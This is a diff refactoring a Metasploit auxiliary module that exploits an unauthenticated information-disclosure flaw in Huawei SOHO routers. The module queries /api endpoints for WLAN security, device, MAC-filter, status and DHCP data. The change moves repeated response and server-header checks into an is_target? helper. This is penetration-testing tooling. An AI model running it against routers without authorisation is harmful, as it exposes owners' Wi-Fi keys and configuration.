@@ -17,14 +17,14 @@ class Metasploit3 < Msf::Auxiliary
       'Description'    => %q{
         This module exploits an un-authenticated information disclosure vulnerability in Huawei
         SOHO routers. The module will gather information by accessing the /api pages where
-        authentication is not required, allowing configuration changes
-        as well as information disclosure including any stored SMS.
+        authentication is not required, allowing configuration changes as well as information
+        disclosure including any stored SMS.
       },
       'License'        => MSF_LICENSE,
       'Author'         =>
         [
           'Jimson K James.',
-          'tomsmaily[at]aczire.com',  #Msf module
+          '<tomsmaily[at]aczire.com>', # Msf module
         ],
       'References'     =>
         [
@@ -65,21 +65,7 @@ class Metasploit3 < Msf::Auxiliary
         'uri'     => '/api/wlan/security-settings',
       })
 
-    #check whether we got any response from server and proceed.
-    unless res
-      print_error('Failed to get any response from server!!!')
-      return
-    end
-
-    #Is it a HTTP OK
-    unless res.code == 200
-      print_error('Did not get HTTP 200, URL was not found. Exiting!')
-      return
-    end
-
-    #Check to verify server reported is a Huawei router
-    unless res.headers['Server'].match(/IPWEBS\/1.4.0/i)
-      print_error('Target doesn\'t seem to be a Huawei router. Exiting!')
+    unless is_target?(res)
       return
     end
 
@@ -169,25 +155,7 @@ class Metasploit3 < Msf::Auxiliary
         'uri'     => '/api/device/information',
       })
 
-    #check whether we got any response from server and proceed.
-    unless res
-      print_error('Failed to get any response from server!!!')
-      return
-    end
-
-    #Is it a HTTP OK
-    if res.code == 200
-      print_status('Okay, Got an HTTP 200 (okay) code. Verifying Server header')
-    else
-      print_error('Did not get HTTP 200, URL was not found. Exiting!')
-      return
-    end
-
-    #Check to verify server reported is a Huawei router
-    if res.headers['Server'].match(/IPWEBS\/1.4.0/i)
-      print_status("Server is a Huawei router! Grabbing info\n")
-    else
-      print_error('Target doesn\'t seem to be a Huawei router. Exiting!')
+    unless is_target?(res)
       return
     end
 
@@ -305,21 +273,7 @@ class Metasploit3 < Msf::Auxiliary
         'uri'     => '/api/wlan/mac-filter',
       })
 
-    #check whether we got any response from server and proceed.
-    unless res
-      print_error('Failed to get any response from server!!!')
-      return
-    end
-
-    #Is it a HTTP OK
-    unless res.code == 200
-      print_error('Did not get HTTP 200, URL was not found. Exiting!')
-      return
-    end
-
-    #Check to verify server reported is a Huawei router
-    unless res.headers['Server'].match(/IPWEBS\/1.4.0/i)
-      print_error('Target doesn\'t seem to be a Huawei router. Exiting!')
+    unless is_target?(res)
       return
     end
 
@@ -412,21 +366,7 @@ class Metasploit3 < Msf::Auxiliary
         'uri'     => '/api/monitoring/status',
       })
 
-    #check whether we got any response from server and proceed.
-    unless res
-      print_error('Failed to get any response from server!!!')
-      return
-    end
-
-    #Is it a HTTP OK
-    unless res.code == 200
-      print_error('Did not get HTTP 200, URL was not found. Exiting!')
-      return
-    end
-
-    #Check to verify server reported is a Huawei router
-    unless res.headers['Server'].match(/IPWEBS\/1.4.0/i)
-      print_error('Target doesn\'t seem to be a Huawei router. Exiting!')
+    unless is_target?(res)
       return
     end
 
@@ -460,21 +400,7 @@ class Metasploit3 < Msf::Auxiliary
         'uri'     => '/api/dhcp/settings',
       })
 
-    #check whether we got any response from server and proceed.
-    unless res
-      print_error('Failed to get any response from server!!!')
-      return
-    end
-
-    #Is it a HTTP OK
-    unless res.code == 200
-      print_error('Did not get HTTP 200, URL was not found. Exiting!')
-      return
-    end
-
-    #Check to verify server reported is a Huawei router
-    unless res.headers['Server'].match(/IPWEBS\/1.4.0/i)
-      print_error('Target doesn\'t seem to be a Huawei router. Exiting!')
+    unless is_target?(res)
       return
     end
 
@@ -513,5 +439,27 @@ class Metasploit3 < Msf::Auxiliary
       dhcpleasetime = $1
       print_status("DHCP Lease Time: #{dhcpleasetime}")
     end
+  end
+
+  def is_target?(res)
+    #check whether we got any response from server and proceed.
+    unless res
+      print_error('Failed to get any response from server.')
+      return false
+    end
+
+    #Is it a HTTP OK
+    unless res.code == 200
+      print_error('Did not get HTTP 200, URL was not found.')
+      return false
+    end
+
+    #Check to verify server reported is a Huawei router
+    unless res.headers['Server'].match(/IPWEBS\/1.4.0/i)
+      print_error('Target doesn\'t seem to be a Huawei router')
+      return false
+    end
+
+    true
   end
 end
